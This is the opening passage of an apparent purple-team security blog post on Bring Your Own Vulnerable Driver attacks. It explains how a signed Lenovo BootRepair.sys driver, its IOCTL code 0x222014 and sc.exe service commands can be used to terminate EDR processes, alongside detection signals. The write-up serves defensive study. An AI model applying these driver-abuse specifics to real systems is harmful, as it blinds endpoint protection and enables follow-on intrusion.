@@ -1,0 +1,1868 @@
+# https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/
+
+<!DOCTYPE html><html>
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    
+    
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  
+
+  <body class="page-loaded">
+    <div class="wrapper-masthead reveal reveal-delay-1 visible">
+      <div class="container">
+        
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="attack reveal reveal-delay-2 visible">
+  <h1>Phantom in the Ring: BYOVD, IOCTL Hunting, and the Art of Killing EDRs from Kernel Space</h1>
+
+  <div class="entry">
+    <p><img height="180" align="left" src="https://benjitrapp.github.io/images/edr-phontom-in-the-ring.png">
+Modern EDR agents run as Protected Processes backed by tamper-protection flags, kernel callbacks, and watchdog services. For years this defensive stack held firm. Then came <strong>Bring Your Own Vulnerable Driver (BYOVD)</strong>: load a legitimately signed driver from a hardware vendor, invoke a kernel-level process-kill primitive the EDR never expected to watch, and watch the agent terminate. No unsigned code. No DSE bypass. No alert fired.</p>
+
+<p>The diagram below maps the complete attack across four sequential phases: driver triage and IOCTL discovery, kernel-mode loading, exploitation via a crafted <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> call, and the detection signals each phase leaves behind. Every major section in this article corresponds to one phase in the diagram.</p>
+
+<p><strong>Related:</strong> <a href="https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/">EDR Bypass Roadmap</a> · <a href="https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/">ETW-TI Deep Dive</a> · <a href="https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/">EDR Hook Detection</a> · <a href="https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/">Unified Ransomware Kill Chain</a></p>
+
+<!-- ============================================================
+     DIAGRAM 1 — BYOVD Full Attack Flow
+     ============================================================ -->
+<div style="margin:2rem 0;overflow-x:auto;">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 600" width="100%" style="max-width:900px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
+  <defs>
+    <linearGradient id="bg1" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0d1117"></stop><stop offset="100%" stop-color="#161b22"></stop></linearGradient>
+    <marker id="aG" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#7f8c8d"></polygon></marker>
+    <marker id="aR" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#e74c3c"></polygon></marker>
+    <marker id="aGr" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#27ae60"></polygon></marker>
+  </defs>
+  <rect width="900" height="600" fill="url(#bg1)" rx="10"></rect>
+  <rect width="900" height="600" fill="none" stroke="#30363d" stroke-width="1.5" rx="10"></rect>
+  <!-- title -->
+  <text x="450" y="30" font-size="15" fill="#e6edf3" text-anchor="middle" font-weight="bold">BYOVD — Bring Your Own Vulnerable Driver · Full Attack Flow</text>
+  <text x="450" y="48" font-size="10" fill="#8b949e" text-anchor="middle">Ring 0 Process Kill: Driver Triage → IOCTL Decode → DeviceIoControl → EDR Blind</text>
+  <line x1="30" y1="55" x2="870" y2="55" stroke="#30363d" stroke-width="1"></line>
+
+  <!-- Phase bands -->
+  <text x="14" y="130" font-size="8" fill="#566573" transform="rotate(-90,14,130)">① TRIAGE</text>
+  <text x="14" y="255" font-size="8" fill="#566573" transform="rotate(-90,14,255)">② LOAD</text>
+  <text x="14" y="390" font-size="8" fill="#566573" transform="rotate(-90,14,390)">③ EXPLOIT</text>
+  <text x="14" y="520" font-size="8" fill="#566573" transform="rotate(-90,14,520)">④ DETECT</text>
+
+  <!-- Phase 1 -->
+  <rect x="28" y="62" width="844" height="115" fill="#0f1923" stroke="#30363d" rx="5"></rect>
+  <text x="44" y="79" font-size="9" fill="#566573">① DRIVER TRIAGE &amp; IOCTL DISCOVERY</text>
+  <!-- boxes row -->
+  <rect x="36" y="84" width="188" height="83" fill="#1a3a5c" rx="5" stroke="#2471a3"></rect>
+  <text x="130" y="101" font-size="10" fill="#aed6f1" text-anchor="middle" font-weight="bold">LOLDrivers / VulnDB</text>
+  <text x="130" y="116" font-size="9" fill="#85c1e9" text-anchor="middle">Known-vuln catalogue</text>
+  <text x="130" y="129" font-size="9" fill="#85c1e9" text-anchor="middle">BootRepair.sys · gmer.sys</text>
+  <text x="130" y="142" font-size="9" fill="#5dade2" text-anchor="middle">SHA256 · cert · WDAC status</text>
+  <text x="130" y="157" font-size="8" fill="#2980b9" text-anchor="middle">loldrivers.io · 2197 tracked</text>
+  <line x1="226" y1="126" x2="252" y2="126" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"></line>
+
+  <rect x="254" y="84" width="188" height="83" fill="#3b1f5e" rx="5" stroke="#7d3c98"></rect>
+  <text x="348" y="101" font-size="10" fill="#d7bde2" text-anchor="middle" font-weight="bold">Static RE (IDA / Ghidra)</text>
+  <text x="348" y="116" font-size="9" fill="#c39bd3" text-anchor="middle">Import scan → ntoskrnl</text>
+  <text x="348" y="129" font-size="9" fill="#c39bd3" text-anchor="middle">ZwTerminateProcess</text>
+  <text x="348" y="142" font-size="9" fill="#c39bd3" text-anchor="middle">PsLookupProcessById</text>
+  <text x="348" y="157" font-size="8" fill="#7d3c98" text-anchor="middle">ObOpenObjectByPointer</text>
+  <line x1="444" y1="126" x2="470" y2="126" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"></line>
+
+  <rect x="472" y="84" width="188" height="83" fill="#5c3000" rx="5" stroke="#e67e22"></rect>
+  <text x="566" y="101" font-size="10" fill="#fad7a0" text-anchor="middle" font-weight="bold">IOCTL Code Recovery</text>
+  <text x="566" y="116" font-size="9" fill="#f0b27a" text-anchor="middle">IRP_MJ_DEVICE_CTRL</text>
+  <text x="566" y="129" font-size="9" fill="#f0b27a" text-anchor="middle">MajorFunction[14]</text>
+  <text x="566" y="142" font-size="9" fill="#f0b27a" text-anchor="middle">Code: 0x222014</text>
+  <text x="566" y="157" font-size="8" fill="#e67e22" text-anchor="middle">Input: 4-byte DWORD PID</text>
+  <line x1="662" y1="126" x2="688" y2="126" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"></line>
+
+  <rect x="690" y="84" width="174" height="83" fill="#1c2226" rx="5" stroke="#566573"></rect>
+  <text x="777" y="101" font-size="10" fill="#aab7b8" text-anchor="middle" font-weight="bold">Device Path</text>
+  <text x="777" y="116" font-size="9" fill="#909ca0" text-anchor="middle">DriverEntry → IoCreateDevice</text>
+  <text x="777" y="130" font-size="9" fill="#e67e22" text-anchor="middle">\Device\BootRepair</text>
+  <text x="777" y="144" font-size="9" fill="#e67e22" text-anchor="middle">\DosDevices\BootRepair</text>
+  <text x="777" y="158" font-size="8" fill="#909ca0" text-anchor="middle">Win32: \\.\BootRepair</text>
+
+  <!-- Phase 2 -->
+  <rect x="28" y="190" width="844" height="110" fill="#0f1923" stroke="#30363d" rx="5"></rect>
+  <text x="44" y="207" font-size="9" fill="#566573">② DRIVER LOADING — BYOVD (signed, DSE compliant, Ring 0)</text>
+  <!-- down arrows -->
+  <line x1="130" y1="168" x2="130" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"></line>
+  <line x1="348" y1="168" x2="348" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"></line>
+  <line x1="566" y1="168" x2="566" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"></line>
+  <line x1="777" y1="168" x2="777" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"></line>
+
+  <rect x="36" y="212" width="230" height="78" fill="#0d2318" rx="5" stroke="#27ae60" stroke-width="1.5"></rect>
+  <text x="151" y="230" font-size="10" fill="#82e0aa" text-anchor="middle" font-weight="bold">✔ Legitimately Signed</text>
+  <text x="151" y="246" font-size="9" fill="#76d7a3" text-anchor="middle">BootRepair.sys — LENOVO cert</text>
+  <text x="151" y="260" font-size="9" fill="#76d7a3" text-anchor="middle">Symantec SHA256 CA · 0/71 VT</text>
+  <text x="151" y="274" font-size="9" fill="#52be80" text-anchor="middle">DSE bypass NOT required</text>
+  <text x="151" y="282" font-size="8" fill="#1e8449" text-anchor="middle">HVCI verdict: model-dependent</text>
+  <line x1="268" y1="251" x2="294" y2="251" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"></line>
+
+  <rect x="296" y="212" width="220" height="78" fill="#1c2226" rx="5" stroke="#566573"></rect>
+  <text x="406" y="230" font-size="10" fill="#aab7b8" text-anchor="middle" font-weight="bold">Service Registration</text>
+  <text x="406" y="246" font-size="9" fill="#7f8c8d" text-anchor="middle">sc.exe create svc type=kernel</text>
+  <text x="406" y="260" font-size="9" fill="#7f8c8d" text-anchor="middle">sc.exe start svc</text>
+  <text x="406" y="274" font-size="9" fill="#7fb3d3" text-anchor="middle">Requires: Administrator</text>
+  <text x="406" y="282" font-size="8" fill="#566573" text-anchor="middle">No Dev Mode / Test Sign needed</text>
+  <line x1="518" y1="251" x2="544" y2="251" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"></line>
+
+  <rect x="546" y="212" width="318" height="78" fill="#2c1810" rx="5" stroke="#e74c3c" stroke-width="1.5"></rect>
+  <text x="705" y="230" font-size="10" fill="#f1948a" text-anchor="middle" font-weight="bold">⚠ Executes at Ring 0 — Kernel Mode</text>
+  <text x="705" y="246" font-size="9" fill="#e59866" text-anchor="middle">No DACL — any user can open device handle</text>
+  <text x="705" y="260" font-size="9" fill="#e59866" text-anchor="middle">IRP_MJ_CREATE: no access check enforced</text>
+  <text x="705" y="274" font-size="9" fill="#e59866" text-anchor="middle">IRP_MJ_DEVICE_CONTROL: no caller validation</text>
+  <text x="705" y="282" font-size="8" fill="#f1948a" text-anchor="middle">LowPriv user → effective Ring 0 primitive via Admin</text>
+
+  <!-- Phase 3 -->
+  <rect x="28" y="313" width="844" height="130" fill="#0f1923" stroke="#30363d" rx="5"></rect>
+  <text x="44" y="330" font-size="9" fill="#566573">③ EXPLOITATION — DeviceIoControl → Kernel Call Chain → PPL Bypass</text>
+  <line x1="151" y1="291" x2="151" y2="342" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"></line>
+  <line x1="406" y1="291" x2="406" y2="342" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"></line>
+  <line x1="700" y1="291" x2="700" y2="342" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"></line>
+
+  <rect x="36" y="336" width="200" height="97" fill="#1a2f3f" rx="5" stroke="#2471a3"></rect>
+  <text x="136" y="354" font-size="10" fill="#aed6f1" text-anchor="middle" font-weight="bold">User-Mode App</text>
+  <text x="136" y="370" font-size="9" fill="#85c1e9" text-anchor="middle">CreateFile("\\.\BootRepair")</text>
+  <text x="136" y="384" font-size="9" fill="#85c1e9" text-anchor="middle">→ hDevice</text>
+  <text x="136" y="398" font-size="9" fill="#85c1e9" text-anchor="middle">DeviceIoControl(</text>
+  <text x="136" y="412" font-size="9" fill="#85c1e9" text-anchor="middle">  hDevice, 0x222014,</text>
+  <text x="136" y="424" font-size="9" fill="#f0b27a" text-anchor="middle">  &amp;pid, 4, NULL, 0)</text>
+
+  <line x1="238" y1="384" x2="268" y2="384" stroke="#e74c3c" stroke-width="2" marker-end="url(#aR)"></line>
+  <text x="253" y="378" font-size="8" fill="#e74c3c" text-anchor="middle">IRP</text>
+
+  <rect x="270" y="336" width="230" height="97" fill="#2a1040" rx="5" stroke="#7d3c98"></rect>
+  <text x="385" y="354" font-size="10" fill="#d7bde2" text-anchor="middle" font-weight="bold">Kernel Dispatch</text>
+  <text x="385" y="370" font-size="9" fill="#c39bd3" text-anchor="middle">MajorFunction[14] invoked</text>
+  <text x="385" y="384" font-size="9" fill="#c39bd3" text-anchor="middle">PsLookupProcessByProcessId</text>
+  <text x="385" y="398" font-size="9" fill="#c39bd3" text-anchor="middle">→ PEPROCESS *</text>
+  <text x="385" y="412" font-size="9" fill="#c39bd3" text-anchor="middle">ObOpenObjectByPointer</text>
+  <text x="385" y="424" font-size="9" fill="#c39bd3" text-anchor="middle">→ hProcess (full access)</text>
+
+  <line x1="502" y1="384" x2="530" y2="384" stroke="#e74c3c" stroke-width="2" marker-end="url(#aR)"></line>
+
+  <rect x="532" y="336" width="220" height="97" fill="#2c1810" rx="5" stroke="#e74c3c" stroke-width="2"></rect>
+  <text x="642" y="354" font-size="10" fill="#f1948a" text-anchor="middle" font-weight="bold">ZwTerminateProcess</text>
+  <text x="642" y="370" font-size="9" fill="#e59866" text-anchor="middle">No access-level check</text>
+  <text x="642" y="384" font-size="9" fill="#e59866" text-anchor="middle">No PPL protection check</text>
+  <text x="642" y="398" font-size="9" fill="#e59866" text-anchor="middle">Bypasses tamper-protection</text>
+  <text x="642" y="412" font-size="9" fill="#f1948a" text-anchor="middle" font-weight="bold">→ EDR/AV process KILLED</text>
+  <text x="642" y="424" font-size="9" fill="#f1948a" text-anchor="middle">Works on PPL processes</text>
+
+  <line x1="754" y1="384" x2="780" y2="384" stroke="#e74c3c" stroke-width="2" marker-end="url(#aR)"></line>
+  <rect x="782" y="336" width="82" height="97" fill="#2c1810" rx="5" stroke="#c0392b"></rect>
+  <text x="823" y="356" font-size="9" fill="#f1948a" text-anchor="middle" font-weight="bold">IMPACT</text>
+  <text x="823" y="372" font-size="8" fill="#e59866" text-anchor="middle">EDR blind 🦝</text>
+  <text x="823" y="386" font-size="8" fill="#e59866" text-anchor="middle">AV killed</text>
+  <text x="823" y="400" font-size="8" fill="#e59866" text-anchor="middle">PPL bypass</text>
+  <text x="823" y="414" font-size="8" fill="#e59866" text-anchor="middle">Payload</text>
+  <text x="823" y="428" font-size="8" fill="#e59866" text-anchor="middle">deploy</text>
+
+  <!-- Phase 4 -->
+  <rect x="28" y="456" width="844" height="106" fill="#0d1f17" stroke="#27ae60" rx="5"></rect>
+  <text x="44" y="473" font-size="9" fill="#52be80">④ DETECTION &amp; HUNTING SIGNALS</text>
+  <line x1="136" y1="444" x2="136" y2="480" stroke="#27ae60" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aGr)"></line>
+  <line x1="406" y1="444" x2="406" y2="480" stroke="#27ae60" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aGr)"></line>
+  <line x1="700" y1="444" x2="700" y2="480" stroke="#27ae60" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aGr)"></line>
+
+  <rect x="36" y="477" width="218" height="76" fill="#0d2318" rx="4" stroke="#1e8449"></rect>
+  <text x="145" y="493" font-size="9" fill="#82e0aa" text-anchor="middle" font-weight="bold">Sysmon / ETW</text>
+  <text x="145" y="507" font-size="8" fill="#76d7a3" text-anchor="middle">Event ID 6: Driver loaded</text>
+  <text x="145" y="520" font-size="8" fill="#76d7a3" text-anchor="middle">Hash → LOLDrivers lookup</text>
+  <text x="145" y="533" font-size="8" fill="#52be80" text-anchor="middle">sc.exe type=kernel (EID 7045)</text>
+
+  <rect x="272" y="477" width="258" height="76" fill="#0d2318" rx="4" stroke="#1e8449"></rect>
+  <text x="401" y="493" font-size="9" fill="#82e0aa" text-anchor="middle" font-weight="bold">Process Termination Anomalies</text>
+  <text x="401" y="507" font-size="8" fill="#76d7a3" text-anchor="middle">EDR process missing (no crash)</text>
+  <text x="401" y="520" font-size="8" fill="#76d7a3" text-anchor="middle">CreateFile → \\.\BootRepair</text>
+  <text x="401" y="533" font-size="8" fill="#52be80" text-anchor="middle">DeviceIoControl to unknown device</text>
+
+  <rect x="548" y="477" width="218" height="76" fill="#0d2318" rx="4" stroke="#1e8449"></rect>
+  <text x="657" y="493" font-size="9" fill="#82e0aa" text-anchor="middle" font-weight="bold">MITRE ATT&amp;CK</text>
+  <text x="657" y="507" font-size="8" fill="#76d7a3" text-anchor="middle">T1068 · T1562.001 · T1014</text>
+  <text x="657" y="520" font-size="8" fill="#76d7a3" text-anchor="middle">T1543.003 · T1553.002</text>
+  <text x="657" y="533" font-size="8" fill="#52be80" text-anchor="middle">DrvEye --loldrivers --live-check</text>
+
+  <text x="450" y="570" font-size="8" fill="#2d3436" text-anchor="middle">benjitrapp.github.io · BYOVD Deep Dive · Purple Team Edition 🦝</text>
+</svg>
+</div>
+
+<h3 id="byovd-attack-flow-diagram-walkthrough">BYOVD Attack Flow: Diagram Walkthrough</h3>
+
+<p>The four phase bands in the diagram read left-to-right within each band, connected by dashed arrows flowing downward to the next phase. Together they form a single unbroken chain from driver discovery to EDR termination.</p>
+
+<p><strong>Phase 1: Driver Triage and IOCTL Discovery</strong></p>
+
+<p>Three parallel workstreams identify a viable weapon. A catalogue check against <a href="https://www.loldrivers.io/">LOLDrivers</a> filters a multiple thousands of entries pool for known-vulnerable drivers and returns SHA-256, certificate chain, and WDAC block-list status upfront. Static reverse engineering in IDA or Ghidra targets the import table: the combined presence of <code class="language-plaintext highlighter-rouge">ZwTerminateProcess</code>, <code class="language-plaintext highlighter-rouge">PsLookupProcessByProcessId</code>, and <code class="language-plaintext highlighter-rouge">ObOpenObjectByPointer</code> signals a workable process-kill chain. The <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> handler stored at <code class="language-plaintext highlighter-rouge">MajorFunction[14]</code> is then inspected for the IOCTL constant. For <code class="language-plaintext highlighter-rouge">BootRepair.sys</code> that constant is <code class="language-plaintext highlighter-rouge">0x222014</code>, with a 4-byte DWORD PID as the sole input. The device path (<code class="language-plaintext highlighter-rouge">\Device\BootRepair</code>, Win32 alias <code class="language-plaintext highlighter-rouge">\\.\BootRepair</code>) is recovered from <code class="language-plaintext highlighter-rouge">DriverEntry</code> string references.</p>
+
+<p><strong>Phase 2: Kernel-Mode Loading</strong></p>
+
+<p>The selected driver is dropped to a writable path and registered as a kernel service with two <code class="language-plaintext highlighter-rouge">sc.exe</code> commands. No Developer Mode, no Test Signing mode, no custom bootloader. The driver carries a valid code-signing certificate (LENOVO, issued via Symantec) that satisfies Driver Signature Enforcement. It loads with 0/71 VirusTotal detections at discovery time.</p>
+
+<p>The critical structural flaw surfaces at load time: <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> was called with a <code class="language-plaintext highlighter-rouge">NULL</code> SecurityDescriptor. No DACL was attached to the device object. <code class="language-plaintext highlighter-rouge">IRP_MJ_CREATE</code> enforces no access check and <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> performs no caller validation. Any administrative-level process can open a handle and send IOCTLs without restriction.</p>
+
+<p><strong>Phase 3: Exploitation and EDR Termination</strong></p>
+
+<p>A single <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> call carrying the target PID travels from user-mode into the kernel as an IRP (I/O Request Packet). The dispatch chain executes five steps:</p>
+
+<ol>
+  <li>The I/O manager routes the IRP to <code class="language-plaintext highlighter-rouge">MajorFunction[14]</code>, the device-control handler.</li>
+  <li>The handler matches control code <code class="language-plaintext highlighter-rouge">0x222014</code> and reads the PID from <code class="language-plaintext highlighter-rouge">AssociatedIrp.SystemBuffer</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">PsLookupProcessByProcessId</code> resolves the integer PID to a kernel <code class="language-plaintext highlighter-rouge">EPROCESS</code> pointer.</li>
+  <li><code class="language-plaintext highlighter-rouge">ObOpenObjectByPointer</code> constructs a full-access kernel handle to the target. This call runs at Ring 0, where the PPL access restriction enforced by user-mode <code class="language-plaintext highlighter-rouge">OpenProcess</code> does not exist.</li>
+  <li><code class="language-plaintext highlighter-rouge">ZwTerminateProcess</code> terminates the process. The EDR agent exits. Tamper-protection flags, watchdog services, and kernel callback registrations are now irrelevant: the process hosting them is gone.</li>
+</ol>
+
+<p><strong>Phase 4: Detection and Hunting Signals</strong></p>
+
+<p>Three durable forensic signals fire before the EDR is terminated and represent the blue team’s only reliable window:</p>
+
+<ul>
+  <li><strong>Sysmon Event ID 6</strong> fires at driver load time and captures the SHA-256 hash. Matching this hash against the LOLDrivers feed at ingest is the highest-fidelity detection in the chain.</li>
+  <li><strong>Windows Event 7045</strong> records the <code class="language-plaintext highlighter-rouge">sc.exe</code> kernel service creation with <code class="language-plaintext highlighter-rouge">ServiceType=1</code>.</li>
+  <li>A <code class="language-plaintext highlighter-rouge">CreateFile</code> call to <code class="language-plaintext highlighter-rouge">\\.\BootRepair</code> followed by <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> from a non-hardware-management process is anomalous by definition.</li>
+</ul>
+
+<p>The operational constraint: all three signals fire before EDR termination, but only if the SIEM pipeline ingests them in near-real-time. A 5-minute ingest delay means the EID 6 alert arrives after the EDR is already dead.</p>
+
+<hr>
+
+<ul>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#why-byovd-still-works">Why BYOVD Still Works</a></li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-threat-landscape">The Threat Landscape: Known-Vulnerable Drivers in the Wild</a></li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#phase-1-driver-triage">Phase 1: Driver Triage</a>
+    <ul>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#static-import-scanning">Static Import Scanning</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#drveye-automated-driver-triage-at-scale">DrvEye: Automated Driver Triage at Scale</a></li>
+    </ul>
+  </li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#phase-2-ioctl-anatomy">Phase 2: IOCTL Anatomy</a>
+    <ul>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-ctl_code-macro">The CTL_CODE Macro</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#reversing-ioctls-in-ida-pro">Reversing IOCTLs in IDA Pro</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#reversing-ioctls-in-ghidra">Reversing IOCTLs in Ghidra</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#device-path-recovery">Device Path Recovery</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#dynamic-analysis-intercepting-ioctls-with-frida">Dynamic Analysis: Intercepting IOCTLs with Frida</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#sending-ioctls-from-python">Sending IOCTLs from Python</a></li>
+    </ul>
+  </li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#phase-3-exploitation">Phase 3: Exploitation</a>
+    <ul>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#case-study-phantomkiller">Case Study: PhantomKiller</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-full-kernel-call-chain">The Full Kernel Call Chain</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#nimblackout">NimBlackout: A Nim Adaptation of the Same Primitive</a></li>
+    </ul>
+  </li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#mitre-attck-mapping">MITRE ATT&amp;CK Mapping</a></li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#detection-engineering-and-hunting-playbook">Detection Engineering and Hunting Playbook</a>
+    <ul>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-1-driver-load-events">Signal 1: Driver Load Events</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-2-service-creation-of-kernel-drivers">Signal 2: Service Creation of Kernel Drivers</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-3-deviceiocontrol-to-unknown-devices">Signal 3: DeviceIoControl to Unknown Devices</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-4-protected-process-termination-anomalies">Signal 4: Protected Process Termination Anomalies</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-5-loldrivers-hash-matching-at-ingest">Signal 5: LOLDrivers Hash Matching at Ingest</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#splunk-detection-rules">Splunk Detection Rules</a></li>
+    </ul>
+  </li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#defensive-architecture-hvci-deep-dive">Defensive Architecture: HVCI Deep Dive</a>
+    <ul>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#what-hvci-actually-enforces">What HVCI Actually Enforces</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-hvci-block-list-gap-where-byovd-still-lives">The HVCI Block List Gap: Where BYOVD Still Lives</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#hunting-for-a-working-byovd-candidate">Hunting for a Working BYOVD Candidate</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#byovd-watchdog-live-hvci-gap-intelligence">BYOVD Watchdog: Live HVCI Gap Intelligence</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#hvci-extraction-from-a-target-environment-red-team-context">HVCI Extraction from a Target Environment</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#scoring-a-candidate-the-five-point-checklist">Scoring a Candidate: The Five-Point Checklist</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#wdac-and-loldrivers-based-prevention">WDAC and LOLDrivers-Based Prevention</a></li>
+    </ul>
+  </li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#dse-the-gatekeeper-and-its-bypass">DSE: The Gatekeeper and Its Bypass</a>
+    <ul>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#dse-internals-g_cioptions-and-cidll">DSE Internals: g_cioptions and CI.dll</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-dsebler-technique-ksecddyss-as-a-write-gadget">The Dsebler Technique: KsecDD.sys as a Write Gadget</a></li>
+      <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#byovd-vs-dse-bypass-two-paths-to-ring-0">BYOVD vs. DSE Bypass: Two Paths to Ring 0</a></li>
+    </ul>
+  </li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#byovd-in-ransomware-operations">BYOVD in Ransomware Operations</a></li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#references-and-open-source-research">References and Open-Source Research</a></li>
+</ul>
+
+<hr>
+
+<h2 id="why-byovd-still-works">Why BYOVD Still Works</h2>
+
+<p>The constraint Windows imposes on kernel-mode code is binary: a driver must be signed by a certificate chaining to a trusted root before DSE allows it to load. This was a meaningful control when kernel-mode exploits required fresh unsigned code. BYOVD sidesteps the constraint entirely; it does not exploit DSE, it complies with it.</p>
+
+<p>The attack model is straightforward:</p>
+
+<ol>
+  <li>Find a driver that is legitimately signed by a reputable vendor.</li>
+  <li>Identify that the driver exposes a dangerous kernel-level primitive (process termination, arbitrary read/write, physical memory access) with no caller validation.</li>
+  <li>Load the driver on the target system (requires administrative privileges, but not Developer Mode or Test Mode).</li>
+  <li>Invoke the primitive via a crafted <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> call.</li>
+</ol>
+
+<p>The result: after passing the admin boundary, an attacker can terminate PPL-protected processes (including EDR agents with tamper-protection) without ever loading a single unsigned byte of code.</p>
+
+<p>Three factors keep BYOVD alive as an operational technique:</p>
+
+<p><strong>The long tail of signed drivers.</strong> Hardware vendors compiled and signed millions of drivers over decades. Many were written before the security community understood how dangerous unrestricted kernel primitives exposed to user-mode were. Once signed, those drivers persist indefinitely in vendor update packages, recovery tools, and pre-installed software suites.</p>
+
+<p><strong>Revocation lag.</strong> Certificate revocation and WDAC block-list updates are reactive, not proactive. A driver discovered by a researcher today may remain loadable on unpatched systems for months or years.</p>
+
+<p><strong>HVCI is not universal.</strong> Hypervisor-Protected Code Integrity (HVCI / Memory Integrity) renders most BYOVD drivers unloadable, but it requires compatible hardware and is not enabled by default on all Windows configurations. Enterprise adoption remains incomplete. Even with HVCI enabled, 479 known-vulnerable drivers still load as of mid-2026.</p>
+
+<hr>
+
+<h2 id="the-threat-landscape-known-vulnerable-drivers-in-the-wild">The Threat Landscape: Known-Vulnerable Drivers in the Wild</h2>
+
